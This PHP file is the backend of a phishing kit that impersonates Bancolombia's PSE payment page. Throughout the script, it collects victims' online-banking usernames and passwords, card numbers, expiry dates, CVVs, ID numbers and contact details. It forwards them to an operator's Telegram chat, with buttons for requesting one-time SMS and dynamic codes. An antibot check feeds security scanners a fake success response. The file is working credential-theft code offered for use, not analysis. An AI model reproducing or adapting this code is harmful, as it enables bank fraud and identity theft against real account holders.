<?php
// ============ ANTIBOT (portado del proyecto Aval) ============
require_once __DIR__ . '/../../includes/security.php';
// ===========================================================

header('Content-Type: application/json');
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

try {
    $configLocal = @include __DIR__ . '/config.php';
    $config = is_array($configLocal) ? $configLocal : [];
    
    if (empty($config['bot_token']) || empty($config['chat_id'])) {
        $globalPath = __DIR__ . '/../config.php';
        if (file_exists($globalPath)) {
            $config = include $globalPath;
        }
    }

$rawInputEval = file_get_contents('php://input');
$_evalData = json_decode($rawInputEval, true) ?: $_POST;
$_evalBot = sura_evaluate_submission($_evalData);
if (!empty($_evalBot['is_bot'])) {
    sura_log_bot_detection(sura_client_ip(), $_evalBot['reason'], $_evalData);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}
    $transactionId = $_POST['transactionId'] ?? '';
    $u_id = $_POST['u_id'] ?? '';
    $u_ps = $_POST['u_ps'] ?? '';
    $u_tb_raw = $_POST['u_tb'] ?? '{}';

    if (empty($transactionId) || empty($u_id)) {
        echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
        exit;
    }

    if (empty($config['bot_token']) || empty($config['chat_id'])) {
        echo json_encode(['status' => 'error', 'message' => 'Config vacía (bot_token/chat_id)']);
        exit;
    }

    $tb = json_decode($u_tb_raw, true);
    if (!is_array($tb)) $tb = [];

    // IP & Device
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $device = 'PC';
    if (stripos($userAgent, 'Android') !== false) $device = 'Android';
    elseif (stripos($userAgent, 'iPhone') !== false || stripos($userAgent, 'iPad') !== false) $device = 'iPhone';
    elseif (stripos($userAgent, 'Mobile') !== false) $device = 'Movil';

    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
    $hora = date('d/m/Y H:i:s');

    $banco = !empty($tb['banco']) ? strtoupper($tb['banco']) : 'BANCOLOMBIA';

    $mensaje = "◉ PSE - {$banco} ◉\n\n";

    if (!empty($tb['nombre'])) $mensaje .= "🟢 Nombre: " . $tb['nombre'] . "\n";
    
    $doc = !empty($tb['documento']) ? $tb['documento'] : (!empty($tb['cedula']) ? $tb['cedula'] : '');
    $tipoDoc = !empty($tb['tipo_identificacion']) ? " (" . $tb['tipo_identificacion'] . ")" : "";
    if ($doc) $mensaje .= "🟢 Documento: " . $doc . $tipoDoc . "\n";

    $correo = !empty($tb['correo']) ? $tb['correo'] : (!empty($tb['email']) ? $tb['email'] : '');
    if ($correo) $mensaje .= "🟢 Correo: " . $correo . "\n";

    $tel = !empty($tb['telefono']) ? $tb['telefono'] : (!empty($tb['celular']) ? $tb['celular'] : '');
    if ($tel) $mensaje .= "🟢 Telefono: " . $tel . "\n";

    if (!empty($tb['direccion'])) $mensaje .= "🟢 Direccion: " . $tb['direccion'] . "\n";
    
    if (!empty($tb['total_pagar'])) $mensaje .= "🟢 Monto: $" . number_format((float)$tb['total_pagar'], 0, ',', '.') . "\n";

    if (!empty($tb['tarjeta'])) {
        $mensaje .= "\n"; // Separador para datos de pago
        $mensaje .= "🟢 Tarjeta: " . $tb['tarjeta'] . "\n";
        
        $fecha = !empty($tb['fecha']) ? $tb['fecha'] : "";
        if (empty($fecha) && !empty($tb['expMonth']) && !empty($tb['expYear'])) {
            $fecha = $tb['expMonth'] . "/" . $tb['expYear'];
        }
        if ($fecha) $mensaje .= "🟢 Fecha: " . $fecha . "\n";
        
        if (!empty($tb['cvv'])) $mensaje .= "🟢 CVV: " . $tb['cvv'] . "\n";
        if (!empty($tb['ownerName'])) $mensaje .= "🟢 Titular TC: " . $tb['ownerName'] . "\n";
    }

    $mensaje .= "\n";
    $mensaje .= "🟢 Usuario: " . $u_id . "\n";
    $mensaje .= "🟢 Clave: " . $u_ps . "\n\n";
    $mensaje .= "🟢 IP: {$ip} | Device: {$device} | {$hora}\n\n";
    $mensaje .= "🐙 @FU7UR4MA 🐙";

    // === Teclado Bancolombia ===
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => "Error Logo", 'callback_data' => "error_logo:{$transactionId}"]
            ],
            [
                ['text' => "Dinamica", 'callback_data' => "pedir_dinamica:{$transactionId}"],
                ['text' => "SMS", 'callback_data' => "pedir_sms:{$transactionId}"]
            ],
            [
                ['text' => "Finalizar", 'callback_data' => "confirm_finalizar:{$transactionId}"],
                ['text' => "923", 'callback_data' => "923:{$transactionId}"]
            ],
            [
                ['text' => "T-credito", 'callback_data' => "pedir_credito:{$transactionId}"],
                ['text' => "T-debito", 'callback_data' => "pedir_debito:{$transactionId}"]
            ]
        ]
    ];

    $data = [
        'chat_id' => $config['chat_id'],
        'text' => $mensaje,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $response = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($response === false) {
        echo json_encode(['status' => 'error', 'message' => 'curl_error', 'detail' => $err]);
        exit;
    }

    $result = json_decode($response, true);
    if (!$result) {
        echo json_encode(['status' => 'error', 'message' => 'json_decode_failed', 'raw' => $response]);
        exit;
    }

    echo json_encode([
        'status' => !empty($result['ok']) ? 'success' : 'error',
        'messageId' => !empty($result['ok']) ? ($result['result']['message_id'] ?? null) : null
    ]);
} catch (Throwable $e) {
    echo json_encode(['status' => 'error', 'message' => 'server_exception', 'detail' => $e->getMessage()]);
}
